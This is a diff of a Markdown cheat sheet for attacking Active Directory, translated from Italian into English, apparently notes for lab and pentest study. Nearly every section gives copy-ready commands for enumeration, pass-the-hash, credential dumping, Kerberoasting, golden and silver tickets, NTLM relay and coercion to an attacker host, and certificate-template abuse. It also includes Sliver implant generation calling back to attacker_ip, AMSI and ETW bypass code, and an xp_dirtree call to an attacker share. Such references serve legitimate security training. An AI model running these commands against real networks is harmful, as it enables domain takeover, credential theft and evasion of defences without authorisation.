@@ -1,69 +1,60 @@
-# AD Overview
+# AD-overview
 
-## 02 — AD LDAP
-**Obiettivo:** enumerare AD via LDAP autenticato e anonimo, estrarre attributi sensibili.
+## 02 — AD LDAP 🔄
+Query AD over LDAP to extract users, groups, GPOs, and sensitive attributes before touching anything noisy.
 ```bash
-# Anonimo
+# Anonymous
 ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=local"
 
-# Autenticato
-ldapsearch -H ldap://<IP> -x -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(objectClass=user)"
+# Authenticated
+ldapsearch -H ldap://<IP> -x -D "user@domain.local" -w 'pass' \
+  -b "DC=domain,DC=local" "(objectClass=user)"
 
-# Dump completo
+# Full dump
 ldapdomaindump -u 'domain\user' -p 'pass' <IP>
 
-# Utenti privilegiati (adminCount=1)
+# Privileged users (adminCount=1)
 windapsearch -d domain.local -u user -p pass --da
 
-# Con NetExec
+# NetExec LDAP
 nxc ldap <IP> -u user -p pass --query "(adminCount=1)" ""
 ```
-**Attributi da cercare:** `memberOf`, `description`, `userAccountControl`, `adminCount`, `pwdLastSet`, `msDS-KeyCredentialLink`
+
+**Key attributes:** `memberOf`, `description`, `userAccountControl`, `adminCount`, `pwdLastSet`, `msDS-KeyCredentialLink`
 
 ---
 
-## 03 — PowerView
-**Obiettivo:** enumerazione completa del dominio da Windows, mappare ACL prima di BloodHound.
+## 03 — PowerView ⬜
+Windows-side domain enumeration. Map the ACL landscape manually before running BloodHound.
 ```powershell
 Import-Module .\PowerView.ps1
 
-# Dominio
-Get-Domain; Get-DomainController
-
-# Utenti
-Get-DomainUser | select samaccountname,description,memberof
-Get-DomainUser -SPN                        # kerberoastable
-
-# Gruppi
+Get-Domain
+Get-DomainController
+Get-DomainUser | select samaccountname, description, memberof
+Get-DomainUser -SPN                          # kerberoastable accounts
 Get-DomainGroupMember "Domain Admins"
-
-# Computer
-Get-DomainComputer | select dnshostname,operatingsystem
-
-# ACL interessanti
-Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,ActiveDirectoryRights,SecurityIdentifier
-
-# Share accessibili
+Get-DomainComputer | select dnshostname, operatingsystem
+Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
 Find-DomainShare -CheckShareAccess
 ```
 
 ---
 
-## 04 — BloodHound
-**Obiettivo:** raccogliere e visualizzare attack paths verso DA.
+## 04 — BloodHound ⬜
+Graph-based attack path analysis. Collect → import → find shortest path to DA.
 ```bash
-# Raccolta da Linux
+# Linux collector
 bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All
 
-# Raccolta da Windows
-SharpHound.exe -c All --zipfilename output.zip
+# Windows collector
+SharpHound.exe -c All --zipfilename out.zip
 ```
-**Query Cypher utili:**
 ```cypher
--- Shortest path verso DA
+-- Shortest path to DA
 MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
 
--- Utenti kerberoastable
+-- Kerberoastable users
 MATCH (u:User {hasspn:true}) RETURN u.name
 
 -- Owned → DA
@@ -72,151 +63,152 @@ MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS
 
 ---
 
-## 05 — Windows Lateral Movement
-**Obiettivo:** muoversi lateralmente con credenziali/hash senza cleartext password.
+## 05 — Windows Lateral Movement ⬜
+Move laterally using hashes or tickets — no cleartext needed.
 ```bash
 # Pass-the-Hash
 psexec.py -hashes :<NT> domain/user@<IP>
 wmiexec.py -hashes :<NT> domain/user@<IP>
 evil-winrm -i <IP> -u user -H <NT>
-
-# CME
 nxc smb <IP> -u user -H <NT> -x "whoami"
 
-# PTT con Rubeus (Windows)
+# Pass-the-Ticket (Windows)
 Rubeus.exe asktgt /user:user /rc4:<NT> /ptt
 ```
 
 ---
 
-## 06 — CrackMapExec / NetExec
-**Obiettivo:** enumerazione e exploitation su scala, dump credenziali.
+## 06 — CrackMapExec / NetExec ⬜
+Swiss army knife for SMB/LDAP/WinRM enumeration and credential attacks at scale.
 ```bash
-# Relay list
+# Generate relay list (no SMB signing)
 nxc smb <CIDR> --gen-relay-list no_signing.txt
 
 # Password spray
 nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success
 
-# Dump
+# Credential dump
 nxc smb <IP> -u user -p pass --sam
 nxc smb <IP> -u user -p pass --lsa
 nxc smb <IP> -u user -p pass -M lsassy
 
-# LDAP
+# BloodHound collection via LDAP
 nxc ldap <IP> -u user -p pass --bloodhound -c All
 ```
 
 ---
 
-## 07 — Kerberos Attacks
-**Obiettivo:** abusare del protocollo Kerberos per ottenere hash craccabili o ticket forgati.
+## 07 — Kerberos Attacks ⬜
+Abuse the Kerberos protocol to get crackable hashes or forge tickets.
 ```bash
-# AS-REP Roasting (no preauth)
+# AS-REP Roasting — accounts with PreAuth disabled
 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
 hashcat -m 18200 asrep.txt rockyou.txt
 
-# Kerberoasting
+# Kerberoasting — SPNs on user accounts
 GetUserSPNs.py domain.local/user:pass -outputfile tgs.txt
 hashcat -m 13100 tgs.txt rockyou.txt
 
-# Golden Ticket (post-DCSync)
+# Golden Ticket — requires krbtgt NT hash + domain SID
 ticketer.py -nthash <KRBTGT_NT> -domain-sid <SID> -domain domain.local administrator
 export KRB5CCNAME=administrator.ccache
 psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
 
-# Silver Ticket (per servizio specifico)
-ticketer.py -nthash <SERVICE_NT> -domain-sid <SID> -domain domain.local -spn cifs/server.domain.local user
+# Silver Ticket — targets a specific service
+ticketer.py -nthash <SERVICE_NT> -domain-sid <SID> -domain domain.local -spn cifs/server user
 ```
-**Delegation:**
-- **Unconstrained** → dump TGT da lsass su macchina delegante
-- **Constrained** → S4U2Self + S4U2Proxy
-- **RBCD** → scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity`
+
+**Delegation types:**
+- **Unconstrained** → dump TGTs from lsass on the delegating machine
+- **Constrained** → S4U2Self + S4U2Proxy abuse
+- **RBCD** → write `msDS-AllowedToActOnBehalfOfOtherIdentity` on target
 
 ---
 
-## 08 & 09 — DACL Attacks
-**Obiettivo:** abusare di ACE misconfigured per escalare privilegi o prendere controllo di account.
+## 08 & 09 — DACL Attacks ⬜
+> HTB ref: Eighteen (BadSuccessor)
 
-**ACE da cercare:** `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDACL`, `ForceChangePassword`, `AllExtendedRights`
+Abuse misconfigured ACEs to escalate privileges or take over accounts.
+
+**ACEs to hunt:** `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDACL`, `ForceChangePassword`, `AllExtendedRights`
 ```bash
-# Enum ACL da Linux
+# Enumerate ACLs from Linux
 dacledit.py -action read -target "victim" domain.local/user:pass
 
-# Shadow Credentials (msDS-KeyCredentialLink write)
+# Shadow Credentials — write msDS-KeyCredentialLink → get NT hash
 pywhisker.py -d domain.local -u attacker -p pass --target victim --action add
-# → genera .pfx → certipy auth → NT hash
+certipy auth -pfx victim.pfx -dc-ip <DC_IP>
 
-# ForceChangePassword
+# Force password reset
 net rpc password victim 'NewPass123!' -U domain/attacker%pass -S <DC_IP>
 
-# DCSync (se WriteDACL su dominio)
+# DCSync via WriteDACL on domain object
 dacledit.py -action write -target-dn "DC=domain,DC=local" -principal attacker -rights DCSync domain.local/attacker:pass
 secretsdump.py domain/attacker:pass@<DC_IP> -just-dc
 
-# BadSuccessor (DACL su dMSA)
-# → crea dMSA → eredita credenziali account privilegiato
+# BadSuccessor — abuse delegated MSA DACL → inherit privileged account creds
 ```
 
 ---
 
-## 10 — NTLM Relay
-**Obiettivo:** intercettare autenticazioni NTLM e redirigere verso target vulnerabili.
+## 10 — NTLM Relay ⬜
+Capture and relay NTLM auth to targets without SMB signing enabled.
 
-**Condizioni:** SMB signing OFF sul target, relay verso host diverso dalla source.
+**Conditions:** SMB signing OFF on target, relay to a different host than source.
 ```bash
-# Step 1: targets senza signing
+# Identify targets without signing
 nxc smb <CIDR> --gen-relay-list no_signing.txt
 
-# Step 2: relay verso LDAP (dump / shadow creds / RBCD)
+# Relay to LDAP (dump / shadow creds / RBCD)
 ntlmrelayx.py -tf no_signing.txt -smb2support -t ldap://<DC_IP> --delegate-access
 
-# Step 3: coerce autenticazione
+# Coerce authentication
 PetitPotam.py -u user -p pass <attacker_ip> <target>
-# oppure: printerbug.py domain/user:pass <target> <attacker_ip>
+printerbug.py domain/user:pass <target> <attacker_ip>
 
-# IPv6 + WPAD
+# IPv6 + WPAD poisoning
 mitm6 -d domain.local &
 ntlmrelayx.py -6 -tf no_signing.txt -smb2support --delegate-access
 
-# SOCKS relay
+# SOCKS relay for tool proxying
 ntlmrelayx.py -tf targets.txt -smb2support -socks
 proxychains psexec.py -no-pass domain/user@target
 ```
 
 ---
 
-## 11 — ADCS Attacks
-**Obiettivo:** abusare di misconfigurazioni nei template certificati per impersonare utenti privilegiati.
+## 11 — ADCS Attacks ⬜
+Abuse misconfigured certificate templates to impersonate privileged users.
 ```bash
-# Scan
+# Scan for vulnerabilities
 certipy find -u user@domain.local -p pass -dc-ip <DC_IP> -vulnerable -stdout
 
-# ESC1 (enrollee supplies SAN + client auth EKU)
-certipy req -u user@domain.local -p pass -ca CA_NAME -template VulnTemplate -upn administrator@domain.local
+# ESC1 — enrollee supplies SAN + client auth EKU
+certipy req -u user@domain.local -p pass -ca CA_NAME \
+  -template VulnTemplate -upn administrator@domain.local
 
-# ESC8 (relay HTTP endpoint AD CS)
+# ESC8 — relay HTTP to AD CS enrollment endpoint
 ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 PetitPotam.py <attacker_ip> <DC_IP>
 
-# Cert → TGT → NT hash
+# Cert → TGT → NT hash (PKINIT)
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
-**ESC map:** ESC1 (SAN), ESC2 (Any Purpose), ESC3 (Enrollment Agent), ESC4 (template write), ESC6 (CA flag), ESC8 (relay), ESC9-13 (vari)
+
+**ESC reference:** ESC1 (SAN), ESC2 (Any Purpose EKU), ESC3 (Enrollment Agent), ESC4 (template write), ESC6 (CA flag), ESC8 (relay), ESC9–13 (misc)
 
 ---
 
-## 12 — AD Trust Attacks
-**Obiettivo:** attraversare trust tra domini/forest per escalare in ambienti multi-domain.
+## 12 — AD Trust Attacks ⬜
+Cross domain/forest privilege escalation by abusing trust relationships.
 ```bash
-# Enum trust
+# Enumerate trusts
 Get-DomainTrust
 Get-ForestTrust
 nltest /domain_trusts
 
-# ExtraSIDs (child → parent domain)
-# 1. Ottieni krbtgt del child domain
-# 2. Ottieni SID di Enterprise Admins del parent
+# ExtraSIDs — child domain → parent domain EA
+# Requires: child krbtgt NT hash, child domain SID, parent Enterprise Admins SID
 ticketer.py -nthash <CHILD_KRBTGT_NT> -domain-sid <CHILD_SID> \
   -extra-sid <PARENT_EA_SID> -domain child.domain.local administrator
 export KRB5CCNAME=administrator.ccache
@@ -225,73 +217,79 @@ psexec.py -k -no-pass parent.domain.local/administrator@dc.parent.domain.local
 
 ---
 
-## 13 — C2 con Sliver
-**Obiettivo:** deployare e gestire implant per post-exploitation persistente e stealth.
+## 13 — C2 with Sliver ⬜
+Deploy and manage implants for persistent, stealth post-exploitation.
 ```bash
-# Server
+# Start server
 sliver-server
 
-# Genera implant
+# Generate implants
 generate --mtls <attacker_ip>:443 --os windows --arch amd64 --save implant.exe
 generate beacon --http <attacker_ip> --os windows --save beacon.exe
 
-# Listener
+# Start listeners
 mtls --lport 443
 http --lport 80
 
-# Comandi base (da sessione attiva)
+# Session commands
 use <session_id>
 info / whoami / ps / netstat
-execute -o whoami
-upload / download
+execute -o "whoami /all"
+upload /local/path /remote/path
+download /remote/path
 ```
+
+**Key concepts:** beacon (async) vs session (interactive), BOF extensions via Armory, mTLS for C2 comms, stageless preferred for evasion.
 
 ---
 
-## 14 — Windows Evasion
-**Obiettivo:** bypassare AMSI, ETW e meccanismi di detection per eseguire tool offensivi.
+## 14 — Windows Evasion ⬜
+Bypass AMSI, ETW, AV/EDR to execute offensive tooling undetected.
 ```powershell
-# AMSI bypass (patch in-memory)
+# AMSI patch (in-memory)
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 # ETW patch
-$a=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
-$b=$a.GetField('m_enabled','NonPublic,Instance')
-$arr=@()
-[System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0),$arr,0,1)
+$p = [System.Diagnostics.Eventing.EventProvider]
+$f = $p.GetField('m_enabled','NonPublic,Instance')
+# patch m_enabled to 0 on current provider instance
 ```
-**Tecniche chiave:** process injection, process hollowing, PPID spoofing, LOLBins, syscall unhooking (SysWhispers3 / HellsGate), sleep obfuscation.
+
+**Key techniques:** process injection (classic / early bird / hollowing), PPID spoofing, LOLBins/LOLDrivers, syscall unhooking (SysWhispers3, HellsGate), sleep obfuscation, PS obfuscation (Invoke-Obfuscation).
 
 ---
 
-## 15 — MSSQL / Exchange / SCCM
+## 15 — MSSQL / Exchange / SCCM ⬜
 
 ### MSSQL
 ```bash
 mssqlclient.py domain/user:pass@<IP> -windows-auth
-# xp_cmdshell
-EXEC sp_configure 'show advanced options',1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+
+# Enable and use xp_cmdshell
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
-# Linked servers
+
+# Linked server traversal
 SELECT * FROM sys.servers;
 EXEC('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
+
+# UNC path → Net-NTLMv2 capture
+EXEC xp_dirtree '\\<attacker_ip>\share';
 ```
 
 ### Exchange
 ```bash
-# PrivExchange — relay NTLM verso EWS
+# PrivExchange — relay Exchange auth to LDAP → escalate attacker account
 ntlmrelayx.py -t ldap://<DC_IP> --escalate-user attacker
 privexchange.py -u user -p pass -d domain.local <exchange_ip>
 ```
 
 ### SCCM
 ```bash
-# Enum
 SharpSCCM.exe get site-info
-# NAA credentials
-SharpSCCM.exe get naa
-# SCCMHunter
+SharpSCCM.exe get naa              # Network Access Account creds
+
 python3 sccmhunter.py find -u user -p pass -d domain.local -dc <DC_IP>
 ```
 
@@ -299,20 +297,22 @@ python3 sccmhunter.py find -u user -p pass -d domain.local -dc <DC_IP>
 
 ## Attack Flow
 ```
-RECON          → nmap, ldapsearch anonimo, enum4linux
-FOOTHOLD       → spray, AS-REP roast, SMB null session
-ENUM AUTH      → BloodHound, PowerView, certipy find, LDAP dump
-PRIVESC        → Kerberoast, DACL abuse, ADCS ESC*, delegation, relay
-LAT MOVEMENT   → PTH, PTT, WMIExec, Evil-WinRM
-DA             → DCSync, Golden Ticket, trust attacks
-POST-EXPLOIT   → Sliver C2, evasion, persistence
+RECON          →  nmap · ldapsearch anon · enum4linux
+FOOTHOLD       →  spray · AS-REP roast · SMB null session
+ENUM AUTH      →  BloodHound · PowerView · certipy find · LDAP dump
+PRIVESC        →  Kerberoast · DACL abuse · ADCS ESC* · delegation · relay
+LAT MOVEMENT   →  PTH · PTT · WMIExec · Evil-WinRM
+DA             →  DCSync · Golden Ticket · trust attacks
+POST-EXPLOIT   →  Sliver C2 · evasion · persistence
 ```
 
 ---
 
-## Risorse
+## References
 - https://www.thehacker.recipes
 - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
 - https://github.com/swisskyrepo/PayloadsAllTheThings (AD section)
 - https://github.com/ly4k/Certipy
 - https://github.com/fortra/impacket
+- https://github.com/ly4k/PyWhisker
+- https://github.com/ShawnDEvans/smbmap
